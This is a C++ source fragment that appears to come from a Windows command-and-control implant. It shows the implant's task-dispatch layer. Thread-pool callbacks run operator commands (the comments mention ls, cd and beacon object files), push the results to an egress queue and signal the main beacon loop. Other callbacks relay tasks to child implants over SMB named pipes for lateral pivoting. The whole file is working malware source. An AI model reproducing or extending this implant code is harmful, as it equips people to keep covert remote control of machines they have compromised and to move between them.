// Signals the main loop when a background task completes
HANDLE h_data_ready_event = NULL;



// ======================================================================================
// 1. THREAD POOL WORKER LOGIC/ASYNC HANDLERS
// ======================================================================================


VOID CALLBACK ChildRouterWorker(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
	ChildRouteContext* ctx = static_cast<ChildRouteContext*>(Context);

	ChildRouteInfo cri;
	if (!ChildHandler::instance().get_child(ctx->implant_uuid, cri)) {
		std::cerr << "[-] Route lookup failed for child UUID: " << ctx->implant_uuid << std::endl;
		delete ctx;
		CloseThreadpoolWork(Work);
		return;
	}

	nlohmann::json task_response = SMB::Parent::cycle_child(
		cri.h_pipe_inbox, cri.h_pipe_outbox, ctx->task, true
	);

	if (!task_response.is_null() && !task_response.empty()) {
		bool data_added = false;

		if (task_response.is_array()) {
			for (const auto& item : task_response) {
				PostQueue::push(item);
				data_added = true;
			}
		}
		else if (task_response.is_object()) {
			PostQueue::push(task_response);
			data_added = true;
		}

		if (data_added) {
			SetEvent(h_data_ready_event);
		}
	}

	delete ctx;
	CloseThreadpoolWork(Work);
}

void C2Implant::dispatch_to_child_router(const nlohmann::json& task, const std::string implant_uuid) {
	// Allocate context on the heap so it survives the thread handoff
	ChildRouteContext* ctx = new ChildRouteContext{ task, implant_uuid };

	// Toss it to the OS Threadpool
	PTP_WORK work_item = CreateThreadpoolWork(ChildRouterWorker, ctx, NULL);
	if (work_item) {
		SubmitThreadpoolWork(work_item);
		std::cout << "[+] Task handed to background child router for: " << implant_uuid << std::endl;
	}
	else {
		std::cerr << "[-] Failed to create threadpool work for child router." << std::endl;
		delete ctx;
	}
}

//local task
VOID CALLBACK TaskHandler(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
	// 1. Recover task data from the heap
	nlohmann::json* task_ptr = static_cast<nlohmann::json*>(Context);
	nlohmann::json task_data = *task_ptr;

	// 2. Execute the actual command (ls, cd, bof, etc)
	nlohmann::json result = command_tree(task_data);

	// 3. Ensure the response is linked to the original tasking
	result["task_uuid"] = task_data["task_uuid"];

	// 4. Safely queue the result for the egress transport
	//{
	//	std::lock_guard<std::mutex> lock(queue_mutex);
	//	response_queue.push(result);
	//}
	PostQueue::push(result);

	// 5. Wake up the main cycle() loop to send the response
	SetEvent(h_data_ready_event);

	// 6. Cleanup
	delete task_ptr;
	CloseThreadpoolWork(Work);
}

void C2Implant::dispatch_to_threadpool(const nlohmann::json& task) {
	nlohmann::json* task_context = new nlohmann::json(task);
	//yeet into OS threadpool
	PTP_WORK work_item = CreateThreadpoolWork(TaskHandler, task_context, NULL);
	if (work_item) {
		SubmitThreadpoolWork(work_item);
	}
	else {
		delete task_context;
	}
}

